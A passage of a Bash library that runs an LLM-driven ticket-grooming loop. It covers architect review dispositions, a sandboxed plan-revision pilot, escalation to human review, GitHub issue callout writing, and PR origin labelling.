F-FD [BLOQUANT] — la section \`## Fire-Disposition\` que la première passe
architecte a réclamée est TOUJOURS ABSENTE du plan révisé.

Le plan a bien été modifié, mais le finding n'a pas été traité. En l'état il part
au second passage architecte, où le Fire-Disposition Gate est SANS RECOURS
(« No ITERATE exists at second pass per the two-pass limit ») : le verdict sera
ESCALATE et le ticket ne sera jamais implémenté.

Action demandée, et elle seule : ajouter au plan une section \`## Fire-Disposition\`
nommant l'une des trois options canoniques de mika#1574, avec son détail
d'implémentation —
  (a) exception nommée en allowlist (défaut) : chaque violation existante reçoit
      une entrée grep-visible qui nomme la donnée précise, référence un ticket de
      suivi, et porte une assertion auto-nettoyante ;
  (b) livrer désarmé : \`#[ignore]\` / \`#[cfg(skip)]\` ou équivalent, plus un suivi
      tracké pour l'armer ;
  (c) halte-et-remontée : l'implémentation s'arrête et remonte à l'opérateur.

Si — et seulement si — le plan ne livre réellement AUCUN détecteur (test,
assertion, lint, garde CI, validateur, scan structurel, garde EndTurn), dis-le
explicitement dans la section plutôt que d'inventer une disposition : le gate est
alors N/A et cette phrase est ce qui le rend lisible.

Ne touche à rien d'autre du plan." > "$fd_findings_file" 2>/dev/null || {
        echo "WARN: fire_disposition_retry_findings_unwritable: cannot write $fd_findings_file — skipping retry" >&2
        return 0
    }

    echo "fire_disposition_revise_retried: ${REPO:-?}#${ISSUE_NUM:-?} — section absente du plan révisé alors que les findings de première passe la réclamaient ; relance unique du pilote de revise avec $(basename "$fd_findings_file")" >&2

    local fd_log_id="${LOG_ID:-unknown}-revise-fd-$(date +%s)"
    local fd_stdout; fd_stdout=$(mktemp /tmp/revise-fd-stdout-XXXXXX)
    local fd_stderr; fd_stderr=$(mktemp /tmp/revise-fd-stderr-XXXXXX)

    set +e
    # CWD_ARGS is intentionally word-split (multiple flags)
    # shellcheck disable=SC2086
    _pilot_log_dir; _run_pilot_sandboxed claude-pilot --verbose --log-dir "$_PILOT_LOG_DIR" --task-id "$fd_log_id" \
        --command "/mika-revise-plan" $CWD_ARGS \
        -- "@${fd_findings_file}" \
        >"$fd_stdout" 2>"$fd_stderr"
    set -e
    rm -f "$fd_stdout" "$fd_stderr"

    # La section est re-testée POUR JOURNALISER, jamais pour reboucler : le
    # compteur est déjà armé, donc aucun chemin ne réarme le lancement. C'est ce
    # qui réconcilie « une seule relance » et « l'événement doit savoir si la
    # section manque encore » — le prédicat est évalué deux fois, il n'autorise
    # l'action qu'une.
    #
    # Les deux événements sont de l'OBSERVABILITÉ PURE : consommés par
    # l'opérateur et par l'analyse de logs (mika#2205), relus par aucune branche
    # de ce fichier, sans effet sur le flot de la boucle. Régime attendu :
    # `fire_disposition_revise_retried` rare, `fire_disposition_still_missing_after_retry`
    # à zéro. Une occurrence soutenue du second dit que le pilote de revise ne
    # sait pas écrire la section — donc que le correctif est côté
    # `/mika-revise-plan` (suivi mika-platform), PAS un troisième essai ici.
    if ! grep -qE '^## Fire-Disposition' "$plan_path" 2>/dev/null; then
        echo "fire_disposition_still_missing_after_retry: ${REPO:-?}#${ISSUE_NUM:-?} — la seconde tentative n'a pas produit la section ; le plan part au second passage architecte. Aucune troisième relance (budget épuisé)." >&2
    fi

    return 0
}

_cleanup_iterate_findings() {
    # Sweep $WORKTREE_DIR/.iterate/ on GROOMED success. PRESERVE on ESCALATE
    # for forensic access — the worktree TTL handles eventual cleanup, and the
    # findings file is the operator's primary forensic artifact when deciding
    # whether to retry, refactor, or kill the plan. Sweeping it on ESCALATE
    # deletes the evidence at exactly the moment it's most useful.
    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || return 0
    local findings_dir="$WORKTREE_DIR/.iterate"
    [ -d "$findings_dir" ] || return 0
    # mika#1943: le `[ -d ]` ci-dessus prouve que le chemin existe, jamais qu'il
    # est à nous. Sur refus on conserve — les findings sont de toute façon un
    # artefact forensique dont la préservation est le défaut sur ESCALATE.
    _assert_removable_worktree_path "$findings_dir" cleanup_iterate_findings || return 0
    rm -rf "$findings_dir" 2>/dev/null || true
    echo "_cleanup_iterate_findings: swept $findings_dir on GROOMED" >&2
}

_escalate_groom() {
    # Phase D escalation helper (mika#1271) — fail loudly per mika#1033 precedent
    # when the architect returns ESCALATE (first-pass or second-pass). Writes the
    # architect's escalation rationale to $WORKTREE_DIR/.iterate/escalate-<stage>.md
    # for operator forensic access, and appends a structured PIPELINE FAILURE
    # marker to RESULT so the callback delivers an actionable error rather than
    # a generic "no PR" message.
    #
    # Findings are PRESERVED on ESCALATE — never swept. Worktree TTL handles
    # eventual cleanup. The findings file is the operator's primary forensic
    # artifact when deciding whether to retry, refactor, or kill the plan.
    #
    # Args:
    #   $1: stage label — "first-pass" | "second-pass-after-ready" | "second-pass-after-iterate"
    #   $2: architect content (the escalation rationale text)
    #   $3: architect session_id (for callback observability + log correlation)
    local stage="$1" content="$2" session_id="$3"

    local findings_dir="$WORKTREE_DIR/.iterate"
    mkdir -p "$findings_dir" 2>/dev/null || true
    local findings_file="$findings_dir/escalate-${stage}.md"
    printf '%s\n' "$content" > "$findings_file" 2>/dev/null || true

    echo "iterate_groom_loop: ESCALATE at ${stage} — failing loudly per mika#1033 (findings at ${findings_file})" >&2

    RESULT="${RESULT}
PIPELINE FAILURE: groom escalated by mika-arch ${stage}.
Verdict: ESCALATE — human review required.
Session: ${session_id}
Architect findings preserved at: ${findings_file}"

    # mika#2338 — when the ESCALATE was written by the ENGINE (review-anchor
    # attestation withheld after the corrective re-prompt), say so: the cause
    # line travels into RESULT, and the failure reason names the engine rather
    # than the architect. Recognized by the full line shape at line start
    # (_engine_escalation_line), never by `[mika-engine]` alone — an architect
    # ESCALATE whose prose echoes the re-prompt keeps its own reason.
    local engine_line
    engine_line=$(printf '%s\n' "$content" | _engine_escalation_line)
    if [ -n "$engine_line" ]; then
        echo "iterate_groom_loop: engine escalation at ${stage} — review-anchor attestation withheld (mika#2338)" >&2
        RESULT="${RESULT}
Engine reason: ${engine_line}"
        GROOM_LOOP_FAILURE_REASON="engine ESCALATE (${stage}): review-anchor attestation withheld"
    fi
}

_write_canonical_callout() {
    # Phase D canonical body-callout writer (mika#1271). Called from
    # _iterate_groom_loop on GROOMED success. Prepends the canonical 3-line
    # callout block to the issue body so downstream dispatch gates (Pin B /
    # check_grooming_markers in executor.rs) pass with a verified architect
    # verdict.
    #
    # Sole structural writer as of sub-PR 7b: the Class D recovery shim
    # (_verify_and_write_body_callout, mika#1123) and its post-flight call site
    # in _run_claude_pilot were retired now that the iterate loop's architect
    # convergence provides the verified verdict directly.
    #
    # Idempotent: if all three dispatch-gate signals are already in the body
    # (branch line + plan path + second-pass GROOMED marker), skip writing.
    # The organic LLM writer in the dev-groom skill prompt may still emit a
    # callout until the dev-groom-prompt-update follow-up ships; the
    # idempotency check absorbs that overlap cleanly.
    #
    # Args:
    #   $1: stage label — "ready-to-groomed" | "iterate-to-groomed"
    #   $2: architect session_id (for forensic correlation in the body)
    local stage="$1" session_id="$2"

    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || {
        echo "WARN: write_canonical_callout: WORKTREE_DIR unset or missing" >&2; return 1; }
    [ -n "$REPO" ] && [ -n "$ISSUE_NUM" ] && [ -n "$BRANCH" ] || {
        echo "WARN: write_canonical_callout: REPO/ISSUE_NUM/BRANCH unset" >&2; return 1; }

    # Compose the Grooming history line per stage. Every form must carry a
    # verdict marker that `executor.rs::check_grooming_markers` recognises,
    # otherwise the ticket stays structurally invisible to the dispatch gate and
    # gets re-groomed forever (mika#2012).
    #
    # `ready-single-pass` exists because the first-pass READY disposition is a
    # LEGITIMATE grooming exit (/mika-groom-ticket Phase 3 step 10: "Disposition:
    # READY — plan is sound. Commit the staged plan […] and skip to Phase 5").
    # Before mika#2012 it had no stage at all, so this function returned 1, no
    # verdict was written, and the gate never saw the ticket as groomed.
    #
    # Its line must NOT claim "second-pass (GROOMED)" — no second pass ran, and a
    # body that says otherwise is a lie the next reader inherits. It carries its
    # own truthful marker instead, mirroring the shape of the existing
    # "second-pass (READY, paraphrased GROOMED" variant.
    local history_line
    case "$stage" in
        ready-to-groomed)
            history_line="> - **Grooming history:** first-pass (READY) → second-pass (GROOMED) — session-id: ${session_id}"
            ;;
        iterate-to-groomed)
            history_line="> - **Grooming history:** first-pass (ITERATE) → revised → second-pass (GROOMED) — session-id: ${session_id}"
            ;;
        ready-single-pass)
            history_line="> - **Grooming history:** first-pass (READY, single-pass GROOMED) — no second pass required — session-id: ${session_id}"
            ;;
        *)
            # Operator-visible, not just a stderr WARN: an unknown stage means a
            # grooming run produced no verdict marker, which is exactly the
            # silent failure mode mika#2012 was filed for. Make it greppable.
            echo "write_canonical_callout_unknown_stage: stage=\"$stage\" repo=${REPO} issue=${ISSUE_NUM} — NO VERDICT WRITTEN, ticket will re-groom (mika#2012)" >&2
            return 1
            ;;
    esac

    # Locate the plan file via _find_issue_plan (mika#1421 — filename pattern
    # with content-fallback for date-prefix slug-tail filenames).
    local plan_path
    plan_path=$(_find_issue_plan) || {
        echo "WARN: write_canonical_callout: no issue-scoped plan file for $REPO#$ISSUE_NUM" >&2
        return 1
    }
    # The body must carry a REPO-RELATIVE path: it is read by humans on GitHub
    # and by the dispatch gate against the branch, neither of which can resolve
    # a machine-local absolute path. If the strip below is a no-op the plan is
    # not under the worktree, and writing it verbatim would put an absolute path
    # into a public issue body (mika#2012 U3).
    local plan_relpath="${plan_path#"$WORKTREE_DIR/"}"
    case "$plan_relpath" in
        /*)
            echo "write_canonical_callout_plan_outside_worktree: repo=${REPO} issue=${ISSUE_NUM} plan=${plan_path} worktree=${WORKTREE_DIR} — refusing to write an absolute path into the issue body" >&2
            return 1
            ;;
    esac
    [ -f "$WORKTREE_DIR/$plan_relpath" ] || {
        echo "write_canonical_callout_plan_missing: repo=${REPO} issue=${ISSUE_NUM} plan=${plan_relpath} — file not present in worktree" >&2
        return 1
    }

    # Fetch current body for idempotency check.
    local current_body
    current_body=$(gh issue view "$ISSUE_NUM" --repo "senara-solutions/$REPO" \
        --json body -q '.body' 2>/dev/null) || {
        echo "WARN: write_canonical_callout: gh issue view failed for $REPO#$ISSUE_NUM" >&2
        return 1
    }

    # Same three-signal check the dispatch gate uses in
    # executor.rs::check_grooming_markers (Pin B).
    local has_branch has_plan has_verdict
    has_branch=$(printf '%s' "$current_body" | grep -cF '> - **Branch:**' || true)
    has_plan=$(printf '%s' "$current_body" | grep -cF 'docs/plans/' || true)
    # This pattern MUST stay in lockstep with executor.rs's three verdict regexes
    # (GROOMED_VERDICT_RE, PARAPHRASED_GROOMED_RE, SINGLE_PASS_GROOMED_RE).
    # Drift between them is not cosmetic: a form the gate accepts but this check
    # misses makes the writer believe the body is unstamped, so it prepends a
    # SECOND callout block on every pass. That is the callout stacking measured
    # on mika#1962 (2 blocks) — the previous `\(GROOMED\)` required an immediate
    # closing paren and therefore missed the canonical
    # `second-pass (GROOMED — session-id: …)` shape the writer itself emits.
    # Character class mirrors Rust's `[\s\)\.,;:—-]` exactly — no member added,
    # none dropped. (`—` is multi-byte: under a UTF-8 locale it is one class
    # member; under LC_ALL=C its three bytes become three members, which only
    # widens acceptance and so cannot produce a false negative.)
    has_verdict=$(printf '%s' "$current_body" | grep -cE 'second-pass \(GROOMED[[:space:]).,;:—-]|second-pass \(READY, paraphrased GROOMED|first-pass \(READY, single-pass GROOMED' || true)

    if [ "$has_branch" -gt 0 ] && [ "$has_plan" -gt 0 ] && [ "$has_verdict" -gt 0 ]; then
        echo "write_canonical_callout: dispatch-gate signals already present in $REPO#$ISSUE_NUM body — skipping (idempotent)" >&2
        return 0
    fi

    local head_sha
    head_sha=$(git -C "$WORKTREE_DIR" rev-parse --short HEAD 2>/dev/null)

    local callout_block
    callout_block=$(cat <<CALLOUT_EOF
> - **Branch:** \`${BRANCH}\`
> - **Plan:** \`${plan_relpath}\` (committed on branch @ \`${head_sha}\`)
${history_line}
CALLOUT_EOF
    )

    # REPLACE, never stack (mika#2012 U3). We only reach here when at least one
    # of the three signals was missing, which means the body may still carry a
    # PARTIAL callout — a Branch line with no verdict, a stale Plan path from a
    # prior branch, a recovery callout from mika#1123. Prepending on top of that
    # leaves two callout blocks in the body: the reader cannot tell which is
    # authoritative, and the older block's stale plan path outlives the branch it
    # named. Measured on mika#1962: 2 stacked blocks, the older one carrying no
    # verdict at all.
    #
    # Strip existing callout lines from the PREAMBLE ONLY, then prepend the
    # single authoritative block.
    #
    # Preamble-scoped, not whole-body: a callout line is structurally always at
    # the top of the body, but the same text can legitimately appear lower down
    # inside a fenced block — a ticket that documents the callout format quotes
    # these exact lines. mika#2012's own issue body does. A body-wide `grep -v`
    # would silently delete that documentation while "fixing" a formatting bug.
    # We stop stripping at the first line that is neither a callout nor blank,
    # which also absorbs the blank lines between stacked blocks.
    local stripped_body
    stripped_body=$(printf '%s' "$current_body" | awk '
        BEGIN { preamble = 1 }
        preamble && /^> - \*\*(Branch|Plan|Grooming history):\*\*/ { next }
        preamble && /^[[:space:]]*$/ { next }
        { preamble = 0 }
        { print }
    ')

    local new_body
    new_body=$(printf '%s\n\n%s' "$callout_block" "$stripped_body")
    local tmpfile
    tmpfile=$(mktemp /tmp/canonical-callout-XXXXXX.md)
    printf '%s' "$new_body" > "$tmpfile"

    # mika#1309: capture stderr from gh issue edit so failure cause is visible.
    # The previous `2>/dev/null` silently dropped permission/rate-limit/network
    # errors, leaving the dispatch-gate signals missing without operator-visible
    # cause. We also redirect stdout to /dev/null (gh prints URL on success)
    # and route stderr to a captured variable so it can be surfaced in the WARN
    # line on failure.
    local gh_stderr gh_exit
    gh_stderr=$(gh issue edit "$ISSUE_NUM" --repo "senara-solutions/$REPO" \
        --body-file "$tmpfile" 2>&1 >/dev/null)
    gh_exit=$?
    if [ "$gh_exit" -eq 0 ]; then
        echo "write_canonical_callout: wrote canonical callout to $REPO#$ISSUE_NUM (stage=$stage, session=$session_id)" >&2
        rm -f "$tmpfile"
        return 0
    else
        echo "WARN: write_canonical_callout: gh issue edit failed for $REPO#$ISSUE_NUM (exit=$gh_exit): ${gh_stderr:-<empty>}" >&2
        rm -f "$tmpfile"
        return 1
    fi
}

# Records why _iterate_groom_loop is about to fail, and mirrors it to stderr.
#
# mika#1772: the loop has 18 `return 1` sites — guard trips, a missing plan, a
# failed architect call, a response with no content, three architect refusals,
# an unconverged revise pilot, an unparsable disposition — and every one of
# them used to collapse into the same hardcoded sentence at the call site:
# "architect convergence did not complete … Plan exists on branch but architect
# verdict is missing." On the 2026-08-28 dispatches of mika#2013 the loop never
# reached the architect and no plan existed, so that sentence sent the operator
# hunting a verdict for a file that was never written.
#
# Recording and warning in one act is what keeps the invariant true: a future
# `return 1` copied from a neighbouring site brings its reason with it. The
# variable is global by design (KTD1) — `_iterate_groom_loop` is called
# directly, not in a subshell or pipeline, so the value reaches the caller.
# Same shape as PUSH_VIOLATION_EVIDENCE.
_groom_warn() {
    GROOM_LOOP_FAILURE_REASON="$1"
    echo "WARN: iterate_groom_loop: $1" >&2
}

# mika#2296 — an architect pass that returned an EMPTY `.content`.
#
# This used to be reported as a missing JSON field, which sent the reader
# looking for a transport defect. The measured cause is a budget defect: a
# reasoning model counts its thinking in the OUTPUT budget, so on a heavy brief
# the thinking exhausts `llm_max_tokens` before the verdict line is ever
# emitted. The provider answers 200 with a well-formed envelope whose `content`
# is empty — nothing is missing, the answer is genuinely empty. That ambiguity
# cost three attempts and four tickets.
#
# The engine-side confirmation is one grep, named here so the reader does not
# have to know it exists. Message only — the caller's guard and its `return 1`
# are unchanged.
_groom_warn_empty_content() {
    _groom_warn "$1 returned an EMPTY .content (not a malformed response): the architect \
answered with no visible text. Most likely the model spent its whole output budget on \
internal reasoning before emitting the verdict (mika#2296) — confirm with \
\`grep llm_reasoning_budget_exhausted \$MIKA_SPIRIT_LOG_FILE\`, whose line carries \
output_tokens/max_tokens, and raise \`llm_max_tokens\` in that agent's config.toml if it fired."
}

_iterate_groom_loop() {
    # Phase D — the iterate-loop state machine (mika#1271).
    #
    # Architect-driven groom convergence with five terminal states:
    #   READY    → second-pass GROOMED → _write_canonical_callout "ready-to-groomed"
    #   READY    → second-pass *      → _escalate_groom "second-pass-after-ready"
    #   ITERATE  → revise → second-pass GROOMED → _write_canonical_callout "iterate-to-groomed"
    #   ITERATE  → revise → second-pass *      → _escalate_groom "second-pass-after-iterate"
    #   ESCALATE (first-pass)                   → _escalate_groom "first-pass"
    #
    # GROOMED paths preserve findings in $WORKTREE_DIR/.iterate/ until cleanup
    # at the end of the success branch. ESCALATE paths PRESERVE findings for
    # operator forensic access (worktree TTL handles eventual sweep).
    #
    # Always-on for the dev-groom skill. As of sub-PR 7b the Class D recovery
    # shim is retired; non-zero return from this loop means the dispatch gate
    # may not be satisfied by a canonical writer block on this run, but the
    # pilot's organic write in the dev-groom skill prompt remains a fallback
    # until the dev-groom-prompt-update follow-up ships.
    #
    # Guards: requires WORKTREE_DIR, ISSUE_NUM, REPO; finds the plan file via
    # `_find_issue_plan` (issue-scoped filename pattern first, content-grep
    # fallback for date-prefix slug-tail filenames per mika#1421).
    # Returns 1 if any guard fails.

    # Cleared on entry, deliberately WITHOUT `local`: the caller reads it after
    # a non-zero return, and a local would restore the old unnamed failure.
    GROOM_LOOP_FAILURE_REASON=""

    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || {
        _groom_warn "WORKTREE_DIR unset or missing"; return 1; }
    [ -n "$ISSUE_NUM" ] && [ -n "$REPO" ] || {
        _groom_warn "ISSUE_NUM or REPO unset"; return 1; }

    # Locate the plan file via _find_issue_plan (mika#1421 — filename pattern
    # with content-fallback for date-prefix slug-tail filenames).
    local plan_path
    plan_path=$(_find_issue_plan) || {
        _groom_warn "no issue-scoped plan file for $REPO#$ISSUE_NUM"
        return 1
    }

    echo "iterate_groom_loop: invoking mika-arch first-pass on $(basename "$plan_path")" >&2

    # Phase 1 — first-pass with UNPARSED retry (mika#1823).
    #
    # Kimi k2.5 occasionally omits the required "Disposition:" line even after
    # the engine's required_suffix_line guard has done its single re-prompt.
    # Without a retry here, the first UNPARSED forces PIPELINE FAILURE and the
    # ticket is stranded until manual re-kick. The pre-existing solution doc
    # `docs/solutions/2026-05-21-groom-post-flight-recovery-without-architect-verdict.md`
    # (see § 80) already identified this remedy as a followup — never landed
    # until this PR.
    #
    # Retry envelope: 1 initial + 1 retry. The retry reuses $session_id so the
    # architect sees its own prior turn and can complete it (idempotent). If
    # the second attempt is also UNPARSED the loop falls out of the `for` with
    # an empty $disposition and terminates in the `*)` arm of the case below
    # (bounded, no infinite loop) — it does NOT return 1 from inside this loop.
    local resp1 content1 session_id disposition attempt
    for attempt in 1 2; do
        if [ "$attempt" -eq 1 ]; then
            resp1=$(_arch_ask_with_retry "mika-arch-groom-ticket" "$plan_path") || {
                _groom_warn "first-pass _arch_ask failed$(_arch_ask_error_suffix)"
                return 1
            }
        else
            # Retry: corrective payload as an @-file so _arch_ask injects it
            # verbatim. Session preserved so the architect sees its own prior
            # response and can complete it in-place.
            local retry_prompt; retry_prompt=$(mktemp -t mika-arch-retry-XXXXXX.md 2>/dev/null) || {
                _groom_warn "mktemp failed for retry prompt"
                return 1
            }
            {
                printf 'Your previous plan-review response is missing the required `Disposition:` line.\n\n'
                printf 'Please re-emit your findings and end with exactly ONE of these three lines as the last non-empty line of your response:\n\n'
                printf '    Disposition: READY\n'
                printf '    Disposition: ITERATE\n'
                printf '    Disposition: ESCALATE\n\n'
                printf 'The routing engine parses this line as the verdict — its absence blocks the pipeline (see mika#1823).\n'
            } > "$retry_prompt"
            resp1=$(_arch_ask_with_retry "mika-arch-groom-ticket" "$retry_prompt" "$session_id")
            local _retry_status=$?
            rm -f "$retry_prompt"
            [ "$_retry_status" -eq 0 ] || {
                _groom_warn "retry _arch_ask failed$(_arch_ask_error_suffix)"
                return 1
            }
        fi
        content1=$(printf '%s' "$resp1" | jq -r '.content // empty' 2>/dev/null)
        session_id=$(printf '%s' "$resp1" | jq -r '.metadata.session_id // empty' 2>/dev/null)
        # mika#2296 — the two failures are told apart. An empty `.content` and a
        # missing `.metadata.session_id` used to share one message naming a JSON
        # field, so a budget defect read as a transport defect.
        [ -n "$content1" ] || {
            _groom_warn_empty_content "first-pass"
            return 1
        }
        [ -n "$session_id" ] || {
            _groom_warn "first-pass response missing .metadata.session_id (the envelope itself \
is incomplete — this is NOT the mika#2296 empty-content case)"
            return 1
        }
        disposition=$(printf '%s' "$content1" | _parse_disposition)
        local _trail_suffix=""
        _disposition_was_fuzzy && _trail_suffix=" (fuzzy)"
        local _attempt_marker=""
        [ "$attempt" -gt 1 ] && _attempt_marker="-after-retry"
        _trail_append "groom-ticket" "$session_id" "${disposition:-UNPARSED}${_trail_suffix}${_attempt_marker}"
        case "$disposition" in
            READY|ITERATE|ESCALATE)
                [ "$attempt" -gt 1 ] && echo "INFO: iterate_groom_loop: disposition recovered on retry ($disposition) — mika#1823" >&2
                break
                ;;
        esac
        if [ "$attempt" -eq 1 ]; then
            _groom_warn "first-pass disposition UNPARSED; retrying _arch_ask once with corrective prompt (mika#1823)"
        fi
    done

    case "$disposition" in
        READY)
            echo "iterate_groom_loop: first-pass READY; invoking mika-arch second-pass" >&2
            # Phase 2 — second-pass, continuing the architect session
            local resp2; resp2=$(_arch_ask_with_retry "mika-arch-second-review" "$plan_path" "$session_id") || {
                _groom_warn "second-pass _arch_ask failed$(_arch_ask_error_suffix)"; return 1; }
            local content2; content2=$(printf '%s' "$resp2" | jq -r '.content // empty' 2>/dev/null)
            [ -n "$content2" ] || {
                _groom_warn_empty_content "second-pass"; return 1; }
            local verdict; verdict=$(printf '%s' "$content2" | _parse_verdict)
            local _trail_suffix_v=""
            _disposition_was_fuzzy && _trail_suffix_v=" (fuzzy)"
            _trail_append "second-review" "$session_id" "${verdict:-UNPARSED}${_trail_suffix_v}"

            case "$verdict" in
                GROOMED)
                    echo "iterate_groom_loop: converged on GROOMED for $REPO#$ISSUE_NUM (session $session_id)" >&2
                    _write_canonical_callout "ready-to-groomed" "$session_id" || \
                        echo "WARN: canonical_callout_failed — dispatch gate will reject next ready unless pilot organic write or operator-direct rescue fills the body callout" >&2
                    _cleanup_iterate_findings
                    GROOM_LOOP_FAILURE_REASON=""
                    return 0
                    ;;
                *)
                    GROOM_LOOP_FAILURE_REASON="architect refused on second pass after a READY first pass"
                    _escalate_groom "second-pass-after-ready" "$content2" "$session_id"
                    return 1
                    ;;
            esac
            ;;
        ITERATE)
            echo "iterate_groom_loop: first-pass ITERATE — launching revise pilot with findings" >&2
            # Write architect findings to a tempfile in $WORKTREE_DIR/.iterate/
            # (out-of-namespace from .claude/ to avoid collision with the
            # slash-command snapshot that _set_up_worktree copies in).
            local findings_dir="$WORKTREE_DIR/.iterate"
            mkdir -p "$findings_dir" 2>/dev/null || {
                _groom_warn "cannot create $findings_dir"; return 1; }
            local findings_file="$findings_dir/findings-1.md"
            printf '%s\n' "$content1" > "$findings_file" || {
                _groom_warn "cannot write $findings_file"; return 1; }

            # Launch revise pilot with the findings as @-file payload. Pilot
            # revises plan on disk; we detect via sha256.
            _launch_revise_pilot "$findings_file" || {
                _groom_warn "revise pilot did not converge — preserving $findings_file for forensics"
                return 1
            }

            # Plan revised. Invoke mika-arch second-pass on the revised plan,
            # continuing the architect session so findings stay in conversation
            # memory (per mika-arch-second-review session-continuity contract).
            echo "iterate_groom_loop: invoking mika-arch second-pass on revised plan" >&2
            local resp2_iter; resp2_iter=$(_arch_ask_with_retry "mika-arch-second-review" "$plan_path" "$session_id") || {
                _groom_warn "second-pass _arch_ask failed (after revise)$(_arch_ask_error_suffix)"
                return 1
            }
            local content2_iter; content2_iter=$(printf '%s' "$resp2_iter" | jq -r '.content // empty' 2>/dev/null)
            [ -n "$content2_iter" ] || {
                _groom_warn_empty_content "second-pass (after revise)"
                return 1
            }
            local verdict_iter; verdict_iter=$(printf '%s' "$content2_iter" | _parse_verdict)
            local _trail_suffix_vi=""
            _disposition_was_fuzzy && _trail_suffix_vi=" (fuzzy)"
            _trail_append "second-review" "$session_id" "${verdict_iter:-UNPARSED}${_trail_suffix_vi}"

            case "$verdict_iter" in
                GROOMED)
                    echo "iterate_groom_loop: revised plan converged on GROOMED for $REPO#$ISSUE_NUM (session $session_id)" >&2
                    _write_canonical_callout "iterate-to-groomed" "$session_id" || \
                        echo "WARN: canonical_callout_failed — dispatch gate will reject next ready unless pilot organic write or operator-direct rescue fills the body callout" >&2
                    _cleanup_iterate_findings
                    GROOM_LOOP_FAILURE_REASON=""
                    return 0
                    ;;
                *)
                    GROOM_LOOP_FAILURE_REASON="architect refused on second pass after an ITERATE revise"
                    _escalate_groom "second-pass-after-iterate" "$content2_iter" "$session_id"
                    return 1
                    ;;
            esac
            ;;
        ESCALATE)
            GROOM_LOOP_FAILURE_REASON="architect ESCALATE (first-pass)"
            _escalate_groom "first-pass" "$content1" "$session_id"
            return 1
            ;;
        *)
            # This IS the double-UNPARSED terminal, not a safety net.
            #
            # `_parse_disposition` emits READY, ITERATE, ESCALATE or nothing, so
            # this arm fires on empty and on nothing else — and `disposition` is
            # empty here only when the retry loop above exhausted both attempts
            # without a parsable line. The loop does not `return 1` on that path;
            # it falls out of the `for` and lands here. Two comments claimed
            # otherwise until mika#1772 measured it (test-dispatch-lib.sh, case B
            # of the 2026-07-04 signature block).
            #
            # Returning 1 is right: two failed attempts at a verdict is a real
            # non-convergence. Only the naming was wrong. The reason below travels
            # to `tasks.result` (PR#2028) and is all the operator sees, so calling
            # the designed terminal an "invariant violation" sent them hunting a
            # bug in the loop instead of reading "the architect never emitted the
            # line, twice" — a re-kick repeats it, the retry has already run. That
            # is the mika#1772 defect class exactly, surviving its own fix at the
            # one site the fix believed unreachable.
            #
            # `$attempt` is read, not asserted: widening the retry envelope moves
            # this count with it.
            _groom_warn "first-pass disposition UNPARSED after ${attempt} attempts (initial + mika#1823 corrective retry) — the architect never emitted a parsable 'Disposition:' line"
            return 1
            ;;
    esac
}

# _label_to_type — Map GitHub issue label to conventional-commit type prefix.
# Uses the first matching label from a comma-separated list.
_label_to_type() {
    case "$1" in
        *enhancement*|*feature*) echo "feat" ;;
        *bug*)                   echo "fix" ;;
        *infrastructure*)        echo "chore" ;;
        *documentation*)         echo "docs" ;;
        *refactor*)              echo "refactor" ;;
        *test*)                  echo "test" ;;
        *)                       echo "chore" ;;
    esac
}

# ── PR origin marker (mika#2026) ──────────────────────────────────────────────
#
# The origin of a PR — produced by the autonomous loop, or opened by hand — had
# no instrument. The only existing trace, `tasks.metadata.$.claude_pilot.pr_url`,
# rides a four-link text channel (dispatch-lib discovers the PR → `PR: <url>` in
# RESULT → callback traverses mika-dev + task-engine → regex in dispatcher.rs →
# DB write). Measured 2026-08-30: 43 rows carry a `pr_url` across all repos since
# forever, and the five loop PRs merged 2026-08-27 (#2014–#2018) have none. That
# counter measures well-formed callbacks reaching the engine, not PRs the loop
# produced.
#
# The fix is not to harden four links of a channel that has no PR for a subject:
# the fact lives on the artefact. dispatch-lib — the producer — stamps the PR at
# the moment of production, in shell, never through the pilot's prompt (prompt
# enforcement is exactly what fails at loop substrate).
#
# Read side: `scripts/pr-origin-report.sh`. Absence of the label reads "unknown",
# never "by hand" — a default that looks like an answer is how an instrument lies.
MIKA_PR_ORIGIN_LABEL_COLOR="1d76db"

# Where the producer records the instant it first stamped anything. Absence of the
# label only becomes informative from that instant onward, so the reader needs it —
# and it must be a fact the producer wrote, not a date inferred from a file's mtime:
# `seed_support_dirs` rewrites the installed dispatch-lib.sh unconditionally on
# every daemon start (bundled_skills.rs, `std::fs::write` with no hash gate), so an
# mtime tracks the last restart, not the first stamp. Written exactly once; never
# refreshed, or the cut-off would walk forward and quietly re-open the blind window.
MIKA_PR_ORIGIN_EPOCH_FILE="${MIKA_HOME:-$HOME/.mika}/state/pr-origin-epoch"

# The closed vocabulary. It must stay in step with the reader's buckets in
# scripts/pr-origin-report.sh — a value the producer stamps but the reader does
# not know would vanish into "not-loop" or "unknown" without a word, which is the
# very silence this ticket exists to end. test_stamp_pr_origin.sh parses the
# reader and FAILS if the two drift.
MIKA_PR_ORIGIN_VALUES=(loop spawn manual)

# _stamp_pr_origin <repo> <pr_ref> [origin] — label a PR with its origin.
#
# `pr_ref` is anything `gh pr edit` accepts (URL or number). `origin` defaults to
# `loop`; the label applied is `origin:<origin>`.
#
# The label may not exist yet on repos outside `mika` (dispatch-lib also targets
# mika-cloud, mika-skills, mika-platform, none of which run mika's label-sync
# workflow), so a failed edit is retried once behind an idempotent `label create`.
#
# Returns 0 when the PR carries the label, 1 when it could not be applied — with
# a named line on stderr. Callers MUST invoke with `|| true`: a missing marker
# costs one `unknown` row in a report; it must never cost a dispatch.
_stamp_pr_origin() {
    local repo="$1" pr_ref="$2" origin="${3:-loop}" label known=0 v existing
    [ -n "$repo" ] && [ -n "$pr_ref" ] || return 0

    for v in "${MIKA_PR_ORIGIN_VALUES[@]}"; do
        [ "$origin" = "$v" ] && { known=1; break; }
    done
    if [ "$known" -ne 1 ]; then
        echo "pr_origin.unknown_value: refusing to stamp 'origin:${origin}' on ${repo} PR ${pr_ref} — not in the vocabulary the reader understands (${MIKA_PR_ORIGIN_VALUES[*]}); the PR would read as unclassified instead" >&2
        return 1
    fi

    label="origin:${origin}"

    # Two of the three callsites reach a PR they DISCOVERED on the branch rather
    # than created, and the orchestrator derives branch names with the same script
    # the loop uses. So a by-hand PR can be sitting on this branch already. Never
    # overwrite an origin someone else asserted: claim only an unclaimed PR.
    #
    # Every gh call here is bounded. One of the callsites is the crash/cancel exit
    # trap, whose job is to get RESULT back to mika-dev; a hanging GitHub API must
    # not delay the news that a dispatch died.
